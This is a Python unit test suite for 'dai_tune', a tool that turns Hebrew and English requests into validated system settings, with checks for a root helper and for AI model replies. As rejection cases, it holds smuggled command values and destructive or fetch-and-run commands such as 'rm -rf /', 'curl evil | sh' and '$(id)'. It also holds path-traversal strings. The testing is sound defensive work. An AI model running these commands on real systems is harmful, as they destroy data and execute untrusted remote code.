# SPDX-License-Identifier: Apache-2.0
# Copyright (c) 2026 Diamond Rubinny (d.Ai)
import json
import os
import stat
import subprocess
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from dai_tune import catalog, executor, parser, planner, posture
from dai_tune.catalog import ValidationError
from dai_tune.context import Context


class FakeRunner:
    """Records argv and returns canned results by command prefix."""

    def __init__(self, responses=None):
        self.calls = []
        self.responses = responses or {}

    def __call__(self, argv):
        argv = list(argv)
        self.calls.append(argv)
        for prefix, (code, out) in self.responses.items():
            if tuple(argv[: len(prefix)]) == prefix:
                return subprocess.CompletedProcess(argv, code, out, "error" if code else "")
        return subprocess.CompletedProcess(argv, 0, "", "")


class TuneTestCase(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name) / "root"
        self.home = Path(self.tmp.name) / "home"
        (self.root / "usr/share/zoneinfo/Asia").mkdir(parents=True)
        (self.root / "usr/share/zoneinfo/Asia/Jerusalem").write_text("tz")
        (self.root / "usr/share/zoneinfo/Europe").mkdir(parents=True)
        (self.root / "usr/share/zoneinfo/Europe/London").write_text("tz")
        self.home.mkdir()
        self.runner = FakeRunner()
        self.spawned = []
        self.ctx = Context(root=self.root, home=self.home, runner=self.runner, spawner=self.spawned.append)

    def tearDown(self):
        self.tmp.cleanup()

    def plan(self, text):
        return planner.plan_from_text(text, self.ctx)


class ParserTests(unittest.TestCase):
    def test_hebrew_and_english_examples_all_parse(self):
        for lang, examples in parser.EXAMPLES.items():
            for text in examples:
                with self.subTest(text=text):
                    result = parser.parse(text)
                    self.assertTrue(result.requests)
                    self.assertEqual(result.unknown, [])

    def test_compound_hebrew_sentence(self):
        result = parser.parse("חסום דיסק און קי, כבה בלוטות' ונעל מסך אחרי 5 דקות")
        self.assertEqual(
            [(r.action, r.params) for r in result.requests],
            [
                ("device.block", {"kind": "usb_storage"}),
                ("device.block", {"kind": "bluetooth"}),
                ("session.lock", {"minutes": 5}),
            ],
        )

    def test_vav_before_noun_starts_new_request(self):
        actions = [r.action for r in parser.parse("נעל מסך אחרי 5 דקות ומקלדת עברית אנגלית").requests]
        self.assertEqual(actions, ["session.lock", "keyboard.layouts"])

    def test_several_devices_in_one_clause(self):
        result = parser.parse("חסום מצלמה ובלוטות'")
        self.assertEqual([r.params["kind"] for r in result.requests], ["camera", "bluetooth"])

    def test_partially_understood_clause_is_rejected(self):
        # "lock" and "time zone" in one clause without a separator: refuse
        # rather than silently applying only one of them.
        result = parser.parse("lock the screen after 5 minutes time zone london")
        self.assertEqual(result.requests, [])
        self.assertEqual(len(result.unknown), 1)

    def test_unblock_is_not_block(self):
        self.assertEqual(parser.parse("unblock the camera").requests[0].action, "device.allow")
        self.assertEqual(parser.parse("block the camera").requests[0].action, "device.block")
        self.assertEqual(parser.parse("disable automatic updates").requests[0].params, {"enabled": False})
        self.assertEqual(parser.parse("בטל חסימת מצלמה").requests[0].action, "device.allow")
        self.assertEqual(parser.parse("הסר את החסימה של הדיסק און קי").requests[0].action, "device.allow")
        self.assertEqual(parser.parse("הפעל חסימת מצלמה").requests[0].action, "device.block")

    def test_secure_defaults(self):
        self.assertEqual(parser.parse("open port 8080").requests[0].params["source"], "lan")
        self.assertEqual(parser.parse("פתח פורט 8080 לאינטרנט").requests[0].params["source"], "any")
        self.assertEqual(parser.parse("הפעל חסימת מצלמה").requests[0].action, "device.block")

    def test_injection_is_not_understood(self):
        result = parser.parse("install vlc; rm -rf /")
        self.assertEqual(result.requests[0].params["names"], ["vlc"])
        self.assertEqual(result.unknown, ["rm -rf /"])

    def test_package_list_continues_after_and(self):
        self.assertEqual(parser.parse("install vlc and gimp").requests[0].params["names"], ["vlc", "gimp"])


class ValidationTests(TuneTestCase):
    def validate(self, action, params):
        return catalog.CATALOG[action].validate(params, self.ctx)

    def test_ports(self):
        self.assertEqual(self.validate("firewall.open_port", {"port": "22"})["port"], 22)
        for bad in [0, 70000, "22; rm -rf /", True, None, -1, "0x16"]:
            with self.subTest(port=bad), self.assertRaises(ValidationError):
                self.validate("firewall.open_port", {"port": bad})
        with self.assertRaises(ValidationError):
            self.validate("firewall.open_port", {"port": 22, "source": "everywhere"})
        with self.assertRaises(ValidationError):
            self.validate("firewall.open_port", {"port": 22, "extra": "x"})

    def test_package_names(self):
        self.assertEqual(self.validate("packages.install", {"names": ["vlc", "g++", "vlc"]})["names"], ["vlc", "g++"])
        for bad in ["vlc;rm", "-oAPT::Get=x", "../evil", "VLC", "a" * 70, "x|sh", "$(id)", ""]:
            with self.subTest(name=bad), self.assertRaises(ValidationError):
                self.validate("packages.install", {"names": [bad]})
        with self.assertRaises(ValidationError):
            self.validate("packages.install", {"names": [f"p{i}" for i in range(11)]})

    def test_protected_packages_cannot_be_removed(self):
        for name in ["systemd", "sudo", "nftables", "apparmor", "linux-image-amd64", "python3-pyqt6", "lxqt-panel"]:
            with self.subTest(name=name), self.assertRaises(ValidationError):
                self.validate("packages.remove", {"names": [name]})
        self.assertEqual(self.validate("packages.remove", {"names": ["vlc"]})["names"], ["vlc"])

    def test_hostname_timezone_layouts_lock(self):
        self.assertEqual(self.validate("system.hostname", {"hostname": "office-pc"})["hostname"], "office-pc")
        for bad in ["-bad", "UPPER", "a b", "x;reboot", "a" * 64]:
            with self.subTest(hostname=bad), self.assertRaises(ValidationError):
                self.validate("system.hostname", {"hostname": bad})
        self.assertEqual(self.validate("system.timezone", {"timezone": "Asia/Jerusalem"})["timezone"], "Asia/Jerusalem")
        for bad in ["../../etc/passwd", "Asia/Nowhere", "asia/jerusalem", "Asia/../Etc"]:
            with self.subTest(tz=bad), self.assertRaises(ValidationError):
                self.validate("system.timezone", {"timezone": bad})
        self.assertEqual(self.validate("keyboard.layouts", {"layouts": ["il", "us", "il"]})["layouts"], ["il", "us"])
        with self.assertRaises(ValidationError):
            self.validate("keyboard.layouts", {"layouts": ["xx"]})
        with self.assertRaises(ValidationError):
            self.validate("session.lock", {"minutes": 999})


class PlannerTests(TuneTestCase):
    def test_unknown_or_invalid_blocks_the_whole_plan(self):
        self.assertFalse(self.plan("install vlc; rm -rf /").ok)
        self.assertFalse(self.plan("install vlc&&curl").ok)
        self.assertTrue(self.plan("install vlc").ok)

    def test_ssh_brings_package_and_lan_only_port(self):
        plan = self.plan("enable ssh")
        self.assertEqual(
            [(s.action, s.params) for s in plan.steps],
            [
                ("packages.install", {"names": ["openssh-server"]}),
                ("service.ssh", {"enabled": True}),
                ("firewall.open_port", {"port": 22, "proto": "tcp", "source": "lan"}),
            ],
        )
        self.assertTrue(plan.weakens)

    def test_public_preset_closes_internet_ports(self):
        (self.root / "etc/dai").mkdir(parents=True)
        (self.root / "etc/dai/firewall-allow.json").write_text(json.dumps([
            {"port": 8080, "proto": "tcp", "source": "any"},
            {"port": 22, "proto": "tcp", "source": "lan"},
        ]))
        actions = [(s.action, s.params) for s in self.plan("מצב ציבורי").steps]
        self.assertIn(("firewall.close_port", {"port": 8080, "proto": "tcp"}), actions)
        self.assertNotIn(("firewall.close_port", {"port": 22, "proto": "tcp"}), actions)
        self.assertIn(("device.block", {"kind": "bluetooth"}), actions)

    def test_risk_scope_and_hash(self):
        plan = self.plan("open port 443 from anywhere and lock the screen after 5 minutes")
        self.assertEqual(plan.risk, "high")
        self.assertEqual([s.scope for s in plan.steps], ["system", "user"])
        self.assertEqual(plan.hash, self.plan("open port 443 from anywhere and lock the screen after 5 minutes").hash)

    def test_helper_rebuilds_steps_strictly(self):
        plan = self.plan("block usb and open port 8080")
        payload = {"version": 1, "hash": planner.plan_hash(plan.scoped("system")), "steps": [s.as_dict() for s in plan.scoped("system")]}
        self.assertEqual(len(planner.steps_from_json(payload, self.ctx, "system")), 2)

        bad_payloads = {
            "tampered hash": {**payload, "hash": "000000000000"},
            "user action": {"version": 1, "hash": "x", "steps": [{"action": "session.lock", "params": {"minutes": 5}}]},
            "unknown action": {"version": 1, "hash": "x", "steps": [{"action": "shell.run", "params": {"cmd": "id"}}]},
            "preset": {"version": 1, "hash": "x", "steps": [{"action": "preset.public", "params": {}}]},
            "extra key": {"version": 1, "hash": "x", "steps": [{"action": "device.block", "params": {"kind": "camera"}, "run": "id"}]},
            "bad params": {"version": 1, "hash": "x", "steps": [{"action": "device.block", "params": {"kind": "../../x"}}]},
            "not a plan": ["device.block"],
            "too many": {"version": 1, "hash": "x", "steps": [{"action": "device.block", "params": {"kind": "camera"}}] * 21},
        }
        for name, data in bad_payloads.items():
            with self.subTest(name), self.assertRaises(ValidationError):
                planner.steps_from_json(data, self.ctx, "system")


class ExecutorTests(TuneTestCase):
    def apply(self, text, scope="system"):
        plan = self.plan(text)
        self.assertTrue(plan.ok, plan.errors + plan.unknown)
        journal = executor.Journal.for_system(self.ctx) if scope == "system" else executor.Journal.for_user(self.ctx)
        entry = executor.apply_steps(plan.scoped(scope), self.ctx, journal, actor="1000", scope=scope)
        return entry, journal

    def test_block_usb_and_undo(self):
        entry, journal = self.apply("block usb")
        conf = self.root / "etc/modprobe.d/dai-tune-usb_storage.conf"
        self.assertIn("install usb_storage /bin/false", conf.read_text())
        self.assertIn(["modprobe", "-r", "usb_storage"], self.runner.calls)
        executor.undo_entry(journal.find("last") or entry, self.ctx, journal)
        self.assertFalse(conf.exists())
        self.assertEqual(journal.entries()[-1]["status"], "undone")
        self.assertIsNone(journal.find("last"))

    def test_firewall_validates_before_loading(self):
        self.apply("open port 8080")
        rules = (self.root / "etc/dai/firewall-allow.nft").read_text()
        self.assertIn("tcp dport 8080 accept", rules)
        self.assertIn("192.168.0.0/16", rules)
        nft_calls = [c for c in self.runner.calls if c[0] == "nft"]
        self.assertEqual(nft_calls[:2], [["nft", "-c", "-f", "/etc/nftables.conf"], ["nft", "-f", "/etc/nftables.conf"]])

    def test_failed_step_rolls_back_everything(self):
        self.runner.responses[("nft", "-c")] = (1, "")
        plan = self.plan("block the camera and open port 9000")
        journal = executor.Journal.for_system(self.ctx)
        with self.assertRaises(executor.ApplyError):
            executor.apply_steps(plan.scoped("system"), self.ctx, journal, "1000", "system")
        self.assertFalse((self.root / "etc/modprobe.d/dai-tune-camera.conf").exists())
        self.assertFalse((self.root / "etc/dai/firewall-allow.json").exists())
        self.assertEqual(journal.entries(), [])

    def test_user_lock_and_layouts(self):
        entry, journal = self.apply("נעל מסך אחרי 5 דקות ומקלדת עברית אנגלית", scope="user")
        env = self.home / ".config/dai/session.env"
        self.assertIn("DAI_LOCK_TIMEOUT_SECONDS=300", env.read_text())
        self.assertEqual(stat.S_IMODE(os.stat(env).st_mode), 0o600)
        self.assertEqual(self.spawned[-1][:4], ["swayidle", "-w", "timeout", "300"])
        labwc = (self.home / ".config/labwc/environment").read_text()
        self.assertIn("DAI_LAYOUTS=il,us", labwc)
        self.assertIn("XKB_DEFAULT_LAYOUT=il", (self.home / ".config/labwc/environment.d/50-dai-lang.env").read_text())
        journal_file = journal.path
        self.assertEqual(stat.S_IMODE(os.stat(journal_file).st_mode), 0o600)
        executor.undo_entry(entry, self.ctx, journal)
        self.assertFalse(env.exists())

    def test_packages_use_argv_without_shell(self):
        self.apply("install vlc gimp")
        self.assertIn(["apt-get", "install", "-y", "--no-install-recommends", "vlc", "gimp"], self.runner.calls)
        self.assertFalse(any("sh" == c[0] for c in self.runner.calls))


class PostureTests(TuneTestCase):
    def test_score_and_fixes(self):
        (self.root / "etc/apt/apt.conf.d").mkdir(parents=True)
        (self.root / "etc/nftables.conf").write_text("chain input { type filter hook input priority filter; policy drop; }")
        (self.root / "etc/apt/apt.conf.d/20auto-upgrades").write_text('APT::Periodic::Unattended-Upgrade "0";')
        (self.root / "sys/module/apparmor/parameters").mkdir(parents=True)
        (self.root / "sys/module/apparmor/parameters/enabled").write_text("Y\n")
        self.runner.responses[("lsblk",)] = (0, "disk\npart\ncrypt\n")
        score, checks = posture.assess(self.ctx, "he")
        by_key = {c.key: c for c in checks}
        self.assertTrue(by_key["firewall"].ok)
        self.assertFalse(by_key["updates"].ok)
        self.assertEqual(by_key["updates"].fix, "הפעל עדכונים אוטומטיים")
        self.assertTrue(planner.plan_from_text(by_key["updates"].fix, self.ctx).ok)  # fixes are real phrases
        self.assertEqual(score, 20 + 15 + 15 + 15 + 10 + 10)


if __name__ == "__main__":
    unittest.main()


class HelperTests(TuneTestCase):
    """The root helper's protocol, run against a temporary root."""

    def run_helper(self, argv, stdin="", euid=0):
        import io
        from unittest import mock

        from dai_tune import helper

        out = io.StringIO()
        with mock.patch.object(helper.os, "geteuid", return_value=euid), \
                mock.patch.object(helper, "Context", lambda **kw: self.ctx), \
                mock.patch.object(helper.sys, "stdin", io.StringIO(stdin)), \
                mock.patch.object(helper.syslog, "syslog"), \
                mock.patch("sys.stdout", out):
            code = helper.main(argv)
        return code, json.loads(out.getvalue().strip().splitlines()[-1])

    def payload(self, text):
        steps = self.plan(text).scoped("system")
        return json.dumps({"version": 1, "hash": planner.plan_hash(steps), "steps": [s.as_dict() for s in steps]})

    def test_apply_and_undo_roundtrip(self):
        code, reply = self.run_helper(["helper", "apply"], self.payload("block the camera"))
        self.assertEqual((code, reply["ok"]), (0, True))
        conf = self.root / "etc/modprobe.d/dai-tune-camera.conf"
        self.assertTrue(conf.exists())
        code, reply = self.run_helper(["helper", "undo", reply["id"]])
        self.assertTrue(reply["ok"])
        self.assertFalse(conf.exists())

    def test_rejections(self):
        cases = {
            "not root": (["helper", "apply"], self.payload("block usb"), 1000),
            "garbage": (["helper", "apply"], "not json", 0),
            "user scope": (["helper", "apply"], json.dumps({"version": 1, "hash": "x", "steps": [{"action": "session.lock", "params": {"minutes": 1}}]}), 0),
            "oversized": (["helper", "apply"], " " * (70 * 1024), 0),
            "bad undo id": (["helper", "undo", "../../etc/passwd"], "", 0),
            "unknown command": (["helper", "shell"], "", 0),
        }
        for name, (argv, stdin, euid) in cases.items():
            with self.subTest(name):
                code, reply = self.run_helper(argv, stdin, euid)
                self.assertEqual(code, 1)
                self.assertFalse(reply["ok"])
        self.assertFalse((self.root / "etc/modprobe.d").exists())


class AITests(TuneTestCase):
    def test_schema_limits_actions_to_catalog(self):
        from dai_tune import ai

        enum = ai.schema()["properties"]["requests"]["items"]["properties"]["action"]["enum"]
        self.assertIn("device.block", enum)
        self.assertNotIn("shell.run", enum)
        self.assertIn("block usb storage =>", ai.system_prompt())

    def test_ai_output_goes_through_the_validator(self):
        from dai_tune import ai

        reply = json.dumps({"requests": [
            {"action": "device.block", "params": {"kind": "usb_storage"}},
            {"action": "shell.run", "params": {"cmd": "curl evil | sh"}},
            {"action": "packages.install", "params": {"names": ["vlc; rm -rf /"]}},
        ]})
        plan = planner.build_plan(ai.requests_from_reply(reply, "no flash drives"), self.ctx)
        self.assertEqual([s.action for s in plan.steps], ["device.block"])
        self.assertEqual(len(plan.errors), 2)
        self.assertFalse(plan.ok)  # invented or invalid actions block the whole plan

    def test_garbage_reply(self):
        from dai_tune import ai

        self.assertEqual(ai.requests_from_reply("not json", "x"), [])
        self.assertEqual(ai.requests_from_reply('{"requests": "x"}', "x"), [])

    def test_ai_not_offered_without_model_or_under_yes(self):
        from unittest import mock

        from dai_tune import ai, cli

        with tempfile.TemporaryDirectory() as data, mock.patch.dict(os.environ, {"XDG_DATA_HOME": data}):
            self.assertFalse(ai.model_installed())
            with mock.patch("sys.stdin.isatty", return_value=True), \
                    mock.patch("builtins.input", side_effect=AssertionError("must not prompt")), \
                    mock.patch("sys.stdout"):
                # No model installed: no question, even interactively.
                self.assertEqual(cli.cmd_apply("make it nice", self.ctx, True, False, False), 2)
                models = Path(data) / "dai" / "models"
                models.mkdir(parents=True)
                (models / "m.gguf").write_bytes(b"x")
                self.assertTrue(ai.model_installed())
                # --yes never stops to ask.
                self.assertEqual(cli.cmd_apply("make it nice", self.ctx, True, False, True), 2)


class ForgeActionTests(TuneTestCase):
    """Catalog actions added for D.Ai Forge recipes."""

    def apply(self, action, params):
        spec = catalog.CATALOG[action]
        clean = spec.validate(params, self.ctx)
        step = planner.Step(action, clean, spec.scope, spec.risk(clean), spec.effect(clean))
        journal = executor.Journal(self.root / "journal.json")
        return executor.apply_steps([step], self.ctx, journal, actor="1000", scope=spec.scope), journal

    def test_unit_validation(self):
        validate = catalog.CATALOG["service.unit"].validate
        self.assertEqual(validate({"unit": "clamav-freshclam.service", "enabled": True}, self.ctx)["unit"],
                         "clamav-freshclam.service")
        for unit in ["nftables.service", "apparmor.service", "systemd-resolved.service", "ssh.service",
                     "sddm.service", "NetworkManager.service", "dai-av-scan.timer", "polkit.service"]:
            with self.subTest(unit=unit), self.assertRaises(ValidationError):
                validate({"unit": unit, "enabled": False}, self.ctx)
        for unit in ["../x.service", "x.service; rm -rf /", "x", "x.mount", ""]:
            with self.subTest(unit=unit), self.assertRaises(ValidationError):
                validate({"unit": unit, "enabled": True}, self.ctx)

    def test_unit_apply_and_undo(self):
        (self.root / "usr/lib/systemd/system").mkdir(parents=True)
        (self.root / "usr/lib/systemd/system/clamav-freshclam.service").write_text("[Unit]\n")
        self.runner.responses[("systemctl", "is-enabled")] = (1, "disabled\n")
        entry, journal = self.apply("service.unit", {"unit": "clamav-freshclam.service", "enabled": True})
        self.assertIn(["systemctl", "enable", "--now", "clamav-freshclam.service"], self.runner.calls)
        executor.undo_entry(entry, self.ctx, journal)
        self.assertEqual(self.runner.calls[-1], ["systemctl", "disable", "--now", "clamav-freshclam.service"])

    def test_unit_must_be_installed(self):
        with self.assertRaises(executor.ApplyError):
            self.apply("service.unit", {"unit": "missing.service", "enabled": True})

    def test_user_unit_uses_user_manager(self):
        (self.root / "usr/lib/systemd/user").mkdir(parents=True)
        (self.root / "usr/lib/systemd/user/syncthing.service").write_text("[Unit]\n")
        self.apply("service.user_unit", {"unit": "syncthing.service", "enabled": True})
        self.assertIn(["systemctl", "--user", "enable", "--now", "syncthing.service"], self.runner.calls)
        self.assertEqual(catalog.CATALOG["service.user_unit"].scope, "user")

    def test_flatpak_validation(self):
        validate = catalog.CATALOG["flatpak.install"].validate
        self.assertEqual(validate({"apps": ["org.telegram.desktop"]}, self.ctx),
                         {"apps": ["org.telegram.desktop"], "remote": "flathub"})
        too_many = {"apps": [f"org.app.n{i}" for i in range(6)]}
        for bad in [{"apps": ["telegram"]}, {"apps": ["org.x.y; rm"]}, {"apps": []},
                    {"apps": ["org.a.b"], "remote": "evil"}, too_many]:
            with self.subTest(bad=bad), self.assertRaises(ValidationError):
                validate(bad, self.ctx)
        with self.assertRaises(ValidationError):
            catalog.CATALOG["flatpak.remote"].validate({"name": "https://evil.example/repo"}, self.ctx)

    def test_flatpak_remote_url_is_fixed_and_undone(self):
        self.runner.responses[("flatpak", "remotes")] = (0, "")
        entry, journal = self.apply("flatpak.remote", {"name": "flathub"})
        self.assertIn(["flatpak", "remote-add", "--system", "--if-not-exists", "flathub",
                       "https://dl.flathub.org/repo/flathub.flatpakrepo"], self.runner.calls)
        executor.undo_entry(entry, self.ctx, journal)
        self.assertEqual(self.runner.calls[-1], ["flatpak", "remote-delete", "--system", "--force", "flathub"])

    def test_flatpak_install_undo_removes_only_new_apps(self):
        self.runner.responses[("flatpak", "list")] = (0, "org.signal.Signal\n")
        entry, journal = self.apply("flatpak.install", {"apps": ["org.signal.Signal", "org.telegram.desktop"]})
        executor.undo_entry(entry, self.ctx, journal)
        self.assertEqual(self.runner.calls[-1],
                         ["flatpak", "uninstall", "--system", "-y", "--noninteractive", "org.telegram.desktop"])

    def test_antivirus_schedule(self):
        (self.root / "usr/bin").mkdir(parents=True)
        (self.root / "usr/bin/clamscan").write_text("")
        entry, journal = self.apply("antivirus.schedule", {"enabled": True, "frequency": "weekly"})
        service = (self.root / "etc/systemd/system/dai-av-scan.service").read_text()
        timer = (self.root / "etc/systemd/system/dai-av-scan.timer").read_text()
        self.assertIn("--move=/var/lib/dai/quarantine", service)
        self.assertIn("PrivateNetwork=yes", service)
        self.assertIn("ProtectSystem=strict", service)
        self.assertIn("OnCalendar=weekly", timer)
        self.assertEqual(oct((self.root / "var/lib/dai/quarantine").stat().st_mode & 0o777), "0o700")
        self.assertIn(["systemctl", "enable", "--now", "dai-av-scan.timer"], self.runner.calls)
        self.assertEqual(catalog.CATALOG["antivirus.schedule"].effect({"enabled": True}), "hardens")
        executor.undo_entry(entry, self.ctx, journal)
        self.assertFalse((self.root / "etc/systemd/system/dai-av-scan.service").exists())
        self.assertFalse((self.root / "etc/systemd/system/dai-av-scan.timer").exists())

    def test_antivirus_needs_clamav(self):
        with self.assertRaises(executor.ApplyError):
            self.apply("antivirus.schedule", {"enabled": True})

    def test_disabling_antivirus_weakens(self):
        plan = planner.build_plan([parser.Request("antivirus.schedule", {"enabled": False})], self.ctx)
        self.assertTrue(plan.weakens)

    def test_helper_accepts_new_system_actions_only_in_system_scope(self):
        step = {"action": "service.user_unit", "params": {"unit": "syncthing.service", "enabled": True}}
        steps = [planner.Step("service.user_unit", step["params"], "user", "low", "neutral")]
        payload = {"version": 1, "hash": planner.plan_hash(steps), "steps": [step]}
        with self.assertRaises(ValidationError):
            planner.steps_from_json(payload, self.ctx, scope="system")


class DoctorActionTests(ForgeActionTests):
    """Actions D.Ai Doctor suggests: free disk space, power profiles."""

    def test_clean_frees_caches_only(self):
        (self.root / "var/log/journal").mkdir(parents=True)
        entry, _ = self.apply("system.clean", {})
        self.assertEqual(self.runner.calls[-2:], [["apt-get", "clean"], ["journalctl", "--vacuum-size=200M"]])
        plan = self.plan("פנה מקום בדיסק")
        self.assertTrue(plan.ok)
        self.assertEqual((plan.steps[0].scope, plan.steps[0].effect), ("system", "neutral"))
        with self.assertRaises(ValidationError):
            catalog.CATALOG["system.clean"].validate({"path": "/"}, self.ctx)

    def test_power_profile_apply_and_undo(self):
        (self.root / "usr/bin").mkdir(parents=True)
        (self.root / "usr/bin/powerprofilesctl").write_text("")
        self.runner.responses[("powerprofilesctl", "get")] = (0, "balanced\n")
        entry, journal = self.apply("power.profile", {"profile": "power-saver"})
        self.assertIn(["powerprofilesctl", "set", "power-saver"], self.runner.calls)
        executor.undo_entry(entry, self.ctx, journal)
        self.assertEqual(self.runner.calls[-1], ["powerprofilesctl", "set", "balanced"])
        self.assertEqual(self.plan("מצב חיסכון בסוללה").steps[0].params, {"profile": "power-saver"})
        with self.assertRaises(ValidationError):
            catalog.CATALOG["power.profile"].validate({"profile": "turbo; reboot"}, self.ctx)

    def test_power_profile_needs_the_daemon(self):
        with self.assertRaises(executor.ApplyError):
            self.apply("power.profile", {"profile": "performance"})


class ServiceRestartTests(ForgeActionTests):
    """Restarting a failed service (offered by D.Ai Heal)."""

    def test_restart_validated_and_applied(self):
        (self.root / "usr/lib/systemd/system").mkdir(parents=True)
        (self.root / "usr/lib/systemd/system/cups.service").write_text("")
        plan = self.plan("restart service cups")
        self.assertTrue(plan.ok, plan.errors)
        self.assertEqual(plan.steps[0].params, {"unit": "cups.service"})
        self.apply("service.restart", {"unit": "cups.service"})
        self.assertEqual(self.runner.calls[-2:], [["systemctl", "reset-failed", "cups.service"],
                                                  ["systemctl", "restart", "cups.service"]])
        for unit in ("sddm.service", "dbus.service", "user@1000.service", "cups.service; reboot", "cups.timer"):
            with self.subTest(unit=unit), self.assertRaises(ValidationError):
                catalog.CATALOG["service.restart"].validate({"unit": unit}, self.ctx)
        self.assertIn("would end the session", self.plan("הפעל מחדש את השירות sddm").errors[0])

    def test_not_installed(self):
        with self.assertRaises(executor.ApplyError):
            self.apply("service.restart", {"unit": "nothere.service"})


class SnapshotTests(ForgeActionTests):
    """Snapshots before updates (docs/SNAPSHOTS.md). The real snapper runs in the VM check."""

    LIST = {"root": [
        {"number": 0, "type": "single", "pre-number": None, "description": "current"},
        {"number": 5, "type": "pre", "pre-number": None, "description": "apt"},
        {"number": 6, "type": "post", "pre-number": 5, "description": "apt"},
        {"number": 7, "type": "single", "pre-number": None, "description": "manual"},
        {"number": 8, "type": "pre", "pre-number": None, "description": "apt"},  # an update still running
    ]}

    def snapper_ready(self, fstype="btrfs"):
        (self.root / "usr/bin").mkdir(parents=True, exist_ok=True)
        (self.root / "usr/bin/snapper").write_text("")
        self.runner.responses[("findmnt",)] = (0, f"{fstype}\n")

    def test_enable_on_btrfs_and_undo(self):
        self.snapper_ready()
        entry, journal = self.apply("snapshots.enable", {})
        self.assertIn(["snapper", "--no-dbus", "-c", "root", "create-config", "/"], self.runner.calls)
        self.assertIn("NUMBER_LIMIT=10", self.runner.calls[-1])
        (self.root / "etc/snapper/configs").mkdir(parents=True)
        (self.root / "etc/snapper/configs/root").write_text("")  # what create-config wrote
        executor.undo_entry(entry, self.ctx, journal)
        self.assertEqual(self.runner.calls[-1], ["snapper", "--no-dbus", "-c", "root", "delete-config"])

    def test_enable_refuses_other_filesystems(self):
        self.snapper_ready("ext4")
        with self.assertRaisesRegex(executor.ApplyError, "need a Btrfs disk; / is ext4"):
            self.apply("snapshots.enable", {})
        self.assertFalse(any("create-config" in call for call in self.runner.calls))

    def test_undo_last_update_takes_a_safety_snapshot_first(self):
        import json as _json
        self.snapper_ready()
        self.runner.responses[("snapper", "--no-dbus", "-c", "root", "create")] = (0, "9\n")
        self.runner.responses[("snapper", "--no-dbus", "-c", "root", "--jsonout", "list")] = (0, _json.dumps(self.LIST))
        entry, journal = self.apply("snapshots.undo_update", {})
        snapper_calls = [c[4:] for c in self.runner.calls if c[:1] == ["snapper"]]
        self.assertEqual(snapper_calls[0][:3], ["create", "-t", "single"])
        self.assertEqual(snapper_calls[-1], ["undochange", "5..6"])  # the last finished update, not 8
        executor.undo_entry(entry, self.ctx, journal)
        self.assertEqual(self.runner.calls[-1][4:], ["undochange", "9..0"])
        plan = self.plan("בטל את העדכון האחרון")
        self.assertEqual((plan.steps[0].action, plan.steps[0].risk), ("snapshots.undo_update", "high"))

    def test_nothing_to_undo(self):
        from dai_tune import snapshots
        self.assertIsNone(snapshots.last_update([{"number": 3, "type": "pre", "description": "apt"}]))
        self.assertIsNone(snapshots.last_update([{"number": 4, "type": "post", "pre-number": 3, "description": "apt"}]))
        self.assertEqual(snapshots.last_update([{"number": 3, "type": "pre"}, {"number": 4, "type": "post", "pre_number": 3,
                                                                                "description": "apt"}]), (3, 4))


class PolicyTests(TuneTestCase):
    """Organization policies in /etc/dai/policy.d (docs/EDU.md)."""

    def write(self, name, data, mode=0o644):
        folder = self.root / "etc/dai/policy.d"
        folder.mkdir(parents=True, exist_ok=True)
        path = folder / name
        path.write_text(data if isinstance(data, str) else json.dumps(data))
        os.chmod(path, mode)
        return path

    def test_valid_policy_applies_once_and_is_journaled(self):
        from dai_tune import policy
        self.write("10-school.json", {"format": 1, "name": "School", "apply": ["block usb storage", "turn off bluetooth"]})
        journal = executor.Journal.for_system(self.ctx)
        results = policy.apply_all(self.ctx, journal)
        self.assertTrue(results[0]["ok"], results)
        self.assertTrue((self.root / "etc/modprobe.d/dai-tune-usb_storage.conf").exists())
        self.assertEqual(policy.apply_all(self.ctx, journal)[0]["detail"], "unchanged")
        self.assertEqual(len(journal.entries()), 1)
        self.assertEqual(policy.status(self.ctx)[0]["state"], "applied")
        executor.undo_entry(journal.entries()[0], self.ctx, journal)  # undo works like any change
        self.assertFalse((self.root / "etc/modprobe.d/dai-tune-usb_storage.conf").exists())

    def test_untrusted_or_invalid_policies_are_rejected(self):
        from dai_tune import policy
        self.write("20-writable.json", {"format": 1, "apply": ["block usb storage"]}, mode=0o666)
        self.write("30-user-setting.json", {"format": 1, "apply": ["keyboard english hebrew"]})
        self.write("40-gibberish.json", {"format": 1, "apply": ["make it faster please"]})
        self.write("50-bad.json", "{not json")
        self.write("60-shape.json", {"format": 2, "apply": "block usb"})
        target = self.write("70-target.json", {"format": 1, "apply": ["block usb storage"]})
        (target.parent / "80-link.json").symlink_to(target)
        rows = {row["file"]: row for row in policy.status(self.ctx)}
        for name in ("20-writable.json", "30-user-setting.json", "40-gibberish.json", "50-bad.json",
                     "60-shape.json", "80-link.json"):
            with self.subTest(name=name):
                self.assertEqual(rows[name]["state"], "rejected")
        self.assertIn("writable", rows["20-writable.json"]["problems"][0])
        self.assertIn("only system settings", rows["30-user-setting.json"]["problems"][0])
        self.assertEqual(rows["70-target.json"]["state"], "pending")
        results = policy.apply_all(self.ctx, executor.Journal.for_system(self.ctx))
        self.assertEqual([r["file"] for r in results if r["ok"]], ["70-target.json"])

    def test_screen_lock_for_every_user(self):
        from dai_tune import policy
        from dai_tune.catalog import lock_timeout_seconds
        self.write("10-lock.json", {"format": 1, "name": "School", "apply": ["lock the screen after 5 minutes"]})
        self.write("20-never.json", {"format": 1, "apply": ["never lock the screen"]})
        rows = {row["file"]: row for row in policy.status(self.ctx)}
        self.assertEqual(rows["10-lock.json"]["steps"], ["session.lock_max"])
        self.assertEqual(rows["20-never.json"]["state"], "rejected")
        journal = executor.Journal.for_system(self.ctx)
        results = {r["file"]: r for r in policy.apply_all(self.ctx, journal)}
        self.assertTrue(results["10-lock.json"]["ok"], results)
        env = self.root / "etc/dai/policy-session.env"
        self.assertEqual(env.read_text(), "DAI_LOCK_MAX_SECONDS=300\n")
        self.assertEqual(stat.S_IMODE(env.stat().st_mode), 0o644)  # every session reads it
        # The user may lock sooner, not later and not never; the effective delay is capped.
        self.assertTrue(self.plan("lock the screen after 2 minutes").ok)
        for text in ("lock the screen after 30 minutes", "never lock the screen"):
            plan = self.plan(text)
            self.assertFalse(plan.ok, text)
            self.assertIn("at most 5 minutes", plan.errors[0])
        self.assertEqual(lock_timeout_seconds(self.ctx), 300)  # user default 600, capped
        # Raising the policy limit later works, although the old limit is stricter.
        self.write("10-lock.json", {"format": 1, "name": "School", "apply": ["lock the screen after 10 minutes"]})
